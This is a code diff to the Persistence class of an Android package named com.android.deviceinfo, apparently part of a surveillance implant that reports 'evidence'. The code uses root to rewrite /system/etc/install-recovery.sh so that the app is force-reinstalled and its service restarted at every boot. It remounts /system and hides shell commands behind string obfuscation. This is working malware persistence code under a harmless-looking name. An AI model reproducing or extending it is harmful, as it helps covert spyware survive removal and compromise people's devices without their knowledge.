@@ -1,5 +1,6 @@
 package com.android.deviceinfo;
 
+import java.io.File;
 import java.util.Random;
 
 import android.content.Context;
@@ -8,6 +9,8 @@ import android.content.pm.PackageManager.NameNotFoundException;
 
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.Configuration;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
+import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Execute;
@@ -77,6 +80,10 @@ public class Persistence {
 	 * TODO: se il melt si scaricasse un core, potrebbe usare questa tecnica per avere la persistence
 	 */
 	public void addPersistance() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (addPersistance) ");
+		}
+		
 		String install = M.e("/system/bin/pm install -f ") + storageDir + "/" + getName();
 		String start = M.e("/system/bin/am startservice -n ") + curPackageName + M.e("/.ServiceMain");
 		String scriptBody = "sleep 10\nif " + install + "; then\n" + "    " + start + "\nfi";
@@ -101,7 +108,9 @@ public class Persistence {
 		// Write our script into /system/etc/install-recovery.sh
 		scriptName = "ip";
 		script = M.e("#!/system/bin/sh") + "\n";
-		script += Configuration.shellFile + " " + "ape" + " " + "\"" + scriptBody + "\"" + M.e(" /system/etc/install-recovery.sh");
+		//script += Configuration.shellFile + " " + "qzx" + " " + "\"touch "+  M.e(" /system/etc/install-recovery.sh") +"\""+ "\n";
+		//script += Configuration.shellFile + " " + "pzm" + " 755 "+  M.e(" /system/etc/install-recovery.sh")+ "\n";
+		script += Configuration.shellFile + " " + "ape" + " " + "\"" + scriptBody + "\"" + M.e(" /system/etc/install-recovery.sh")+ "\n";
 		
 		Root.createScript(scriptName, script);
 		Execute.executeRoot(Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + scriptName);
@@ -109,6 +118,11 @@ public class Persistence {
 		
 		// Return /system to normal
 		Execute.execute(Configuration.shellFile + " " + "blr");
+		
+		//AutoFile p = new AutoFile( M.e("/system/etc/install-recovery.sh" ));
+		//if(p.exists()){
+		//	EvidenceReference.info("Persistence");
+		//}
 	}
 	
 	public void removePersistance() {
@@ -116,6 +130,9 @@ public class Persistence {
 	}
 	
 	private void restoreRecovery() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (restoreRecovery) ");
+		}
 		// Remount /system
 		Execute.execute(Configuration.shellFile + " " + "blw");
 		
@@ -143,7 +160,7 @@ public class Persistence {
 	
 			return false;
 		} else {
-			Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "775" + " " + storageDir);
+			Execute.execute(Configuration.shellFile + M.e(" pzm 775 ")  + storageDir);
 			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (genStorage): persistence storage directory created at " + storageDir); //$NON-NLS-1$
